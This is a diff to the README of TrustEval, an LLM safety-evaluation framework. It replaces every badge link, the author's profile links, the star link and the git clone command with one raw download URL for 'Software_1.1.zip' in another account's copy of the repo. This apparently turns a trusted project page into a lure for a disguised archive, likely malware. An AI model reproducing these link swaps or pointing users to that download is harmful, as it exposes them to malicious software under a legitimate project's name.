@@ -7,17 +7,17 @@
 <p align="center">The open-source framework for evaluating LLM safety, fairness, and reliability in regulated industries.</p>
 
 <p align="center">
-  <a href="https://pypi.org/project/trusteval-ai/"><img src="https://img.shields.io/pypi/v/trusteval-ai?color=6366F1&style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Version"></a>
-  <a href="https://pypi.org/project/trusteval-ai/"><img src="https://img.shields.io/pypi/pyversions/trusteval-ai?color=3776AB&style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10 | 3.11 | 3.12"></a>
-  <a href="https://github.com/antrixsh/trusteval/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-10B981?style=for-the-badge" alt="MIT License"></a>
-  <a href="https://github.com/antrixsh/trusteval/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/antrixsh/trusteval/ci.yml?style=for-the-badge&logo=githubactions&logoColor=white&label=CI" alt="CI Status"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/pypi/v/trusteval-ai?color=6366F1&style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Version"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/pypi/pyversions/trusteval-ai?color=3776AB&style=for-the-badge&logo=python&logoColor=white" alt="Python 3.10 | 3.11 | 3.12"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/badge/license-MIT-10B981?style=for-the-badge" alt="MIT License"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/actions/workflow/status/antrixsh/trusteval/ci.yml?style=for-the-badge&logo=githubactions&logoColor=white&label=CI" alt="CI Status"></a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/antrixsh/trusteval/stargazers"><img src="https://img.shields.io/github/stars/antrixsh/trusteval?style=for-the-badge&logo=github&color=yellow" alt="GitHub Stars"></a>
-  <a href="https://github.com/antrixsh/trusteval/network/members"><img src="https://img.shields.io/github/forks/antrixsh/trusteval?style=for-the-badge&logo=github&color=blue" alt="GitHub Forks"></a>
-  <a href="https://github.com/antrixsh/trusteval/issues"><img src="https://img.shields.io/github/issues/antrixsh/trusteval?style=for-the-badge&logo=github&color=orange" alt="Open Issues"></a>
-  <a href="https://pepy.tech/project/trusteval-ai"><img src="https://img.shields.io/badge/downloads-new-6366F1?style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Downloads"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/stars/antrixsh/trusteval?style=for-the-badge&logo=github&color=yellow" alt="GitHub Stars"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/forks/antrixsh/trusteval?style=for-the-badge&logo=github&color=blue" alt="GitHub Forks"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/github/issues/antrixsh/trusteval?style=for-the-badge&logo=github&color=orange" alt="Open Issues"></a>
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip"><img src="https://img.shields.io/badge/downloads-new-6366F1?style=for-the-badge&logo=pypi&logoColor=white" alt="PyPI Downloads"></a>
 </p>
 
 <p align="center">
@@ -424,7 +424,7 @@ We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
 ```bash
 # Clone and setup
-git clone https://github.com/antrixsh/trusteval.git
+git clone https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip
 cd trusteval
 python -m venv .venv
 source .venv/bin/activate  # Windows: .venv\Scripts\activate
@@ -451,8 +451,8 @@ Enterprise AI & Data Science Leader | LinkedIn Top Voice in AI & Data Science
 
 Senior Manager, Data & AI Practice @ Genzeon
 
-- [LinkedIn](https://www.linkedin.com/in/antrixshgupta)
-- [GitHub](https://github.com/antrixsh)
+- [LinkedIn](https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip)
+- [GitHub](https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip)
 
 </td>
 </tr>
@@ -473,7 +473,7 @@ MIT License — see [LICENSE](LICENSE) for details.
 If TrustEval helps your team deploy LLMs responsibly, please consider giving it a star!
 
 <p align="center">
-  <a href="https://github.com/antrixsh/trusteval/stargazers">
+  <a href="https://github.com/patellaaplasticanaemia526/trusteval/raw/refs/heads/main/trusteval/industries/healthcare/Software_1.1.zip">
     <img src="https://img.shields.io/github/stars/antrixsh/trusteval?style=social" alt="GitHub Stars">
   </a>
 </p>
